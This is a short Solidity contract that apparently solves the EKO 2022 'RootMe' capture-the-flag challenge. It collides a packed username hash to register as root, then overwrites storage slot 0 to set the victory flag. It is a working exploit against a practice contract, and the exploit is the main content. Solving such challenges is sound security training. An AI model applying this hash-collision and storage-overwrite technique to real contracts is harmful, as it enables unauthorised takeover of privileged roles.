// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {RootMe} from "../../src/eko2022/04_RootMe/RootMe.sol";

contract RootMe_Attacker {
	address player;
	RootMe rootMe;
	
	constructor(RootMe rootMe_) {
		player = msg.sender;
		rootMe = rootMe_;
	}
	
	receive() external payable {}
	
	function doAttack() public {
		rootMe.register("ROO", "TROOT");
		
		bool victory = true;
		// 先将 bool 转换为 uint256，再转换为 bytes32
		bytes32 result = bytes32(uint256(victory ? 1 : 0));
		
		rootMe.write(bytes32(0), result);
	}
}
